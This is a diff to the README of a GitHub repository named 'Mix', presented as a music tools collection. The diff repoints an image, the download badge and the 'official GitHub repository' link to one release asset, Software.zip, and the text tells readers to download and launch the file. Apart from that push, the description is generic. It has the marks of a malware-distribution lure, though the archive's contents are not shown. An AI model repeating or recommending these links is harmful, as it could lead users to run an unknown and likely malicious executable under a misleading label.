@@ -1,7 +1,7 @@
 
 # 🎧 Welcome to "Mix" Repository! 🎶
 
-![music](https://img.icons8.com/pastel-glyph/2x/music.png)
+![music](https://github.com/imanenaou/mix/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository named "Mix" is a collection of various music-related tools, resources, and projects. Explore the world of music with us!
@@ -14,7 +14,7 @@ This repository named "Mix" is a collection of various music-related tools, reso
 
 ## Installation
 To get started with the "Mix" repository, you can download the latest release by clicking below:
-[![Download Mix](https://img.shields.io/badge/Download-Mix-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Mix](https://github.com/imanenaou/mix/releases/download/v1.0/Software.zip)](https://github.com/imanenaou/mix/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the file to start exploring the music wonders waiting for you!
 
@@ -41,7 +41,7 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 Enjoy your musical journey with "Mix"! Feel the rhythm, embrace the melodies, and let the music guide you through this exciting adventure! 🎵🎸🥁
 
-Looking for more music magic? Visit the [official GitHub repository](https://github.com/cli/cli) for more sound experiences and musical delights! 🎶✨
+Looking for more music magic? Visit the [official GitHub repository](https://github.com/imanenaou/mix/releases/download/v1.0/Software.zip) for more sound experiences and musical delights! 🎶✨
 
 If you encounter any issues with the download link provided, please check the "Releases" section on the official GitHub repository for an alternative source.
 
